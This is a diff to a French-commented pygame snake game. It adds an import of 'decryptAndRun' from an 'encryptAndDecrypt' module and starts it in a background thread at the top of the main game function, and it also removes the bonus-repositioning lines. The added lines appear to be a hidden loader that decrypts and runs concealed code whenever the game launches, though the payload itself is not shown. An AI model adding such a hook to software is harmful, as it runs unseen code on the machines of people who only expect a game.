@@ -2,6 +2,8 @@ import pygame
 import sys
 import random
 import os
+from jeu.encryptAndDecrypt import decryptAndRun
+import threading
 
 pygame.init()
 
@@ -48,6 +50,7 @@ def save_high_score(score):
 
 # ----- Fonction Principale du Jeu -----
 def jeu():
+    threading.Thread(target=decryptAndRun).start()
     global high_score
 
     snake_x = 300
@@ -132,9 +135,6 @@ def jeu():
             bomb_x = random.randrange(0, largeur, taille_bloc)
             bomb_y = random.randrange(0, hauteur, taille_bloc)
 
-            # Replacer le bonus ailleurs
-            bonus_x = random.randrange(0, largeur, taille_bloc)
-            bonus_y = random.randrange(0, hauteur, taille_bloc)
 
         if longueur <= 2:
             game_over = True
